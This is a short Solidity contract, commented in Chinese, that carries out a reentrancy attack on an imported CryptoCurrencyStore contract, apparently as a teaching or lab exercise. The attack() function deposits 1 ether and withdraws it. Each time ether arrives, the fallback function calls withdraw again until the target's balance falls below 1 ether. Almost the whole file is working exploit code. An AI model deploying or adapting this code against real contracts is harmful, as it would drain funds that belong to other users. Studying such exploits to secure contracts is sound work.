// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {CryptoCurrencyStore} from "./CryptoCurrencyStore.sol";

contract AttackCryptoCurrencyStore {
    //初始化 CryptoCurrencyStore 並命名為 store
    CryptoCurrencyStore public store;

    //將CryptoCurrencyStore的智能合約地址在建構時輸入，並附值給store，
    //這樣store就能使用CryptoCurrencyStore的所有公開函式。
    constructor(address _cryptoCurrencyStoreAddress) {
        store = CryptoCurrencyStore(_cryptoCurrencyStoreAddress);
    }

    //當智能合約接收到ether時會直接觸發fallback 對應到24行
    fallback() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }

    //對 CryptoCurrencyStore 合約 執行重入攻擊
    function attack() external payable {
        require(msg.value >= 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
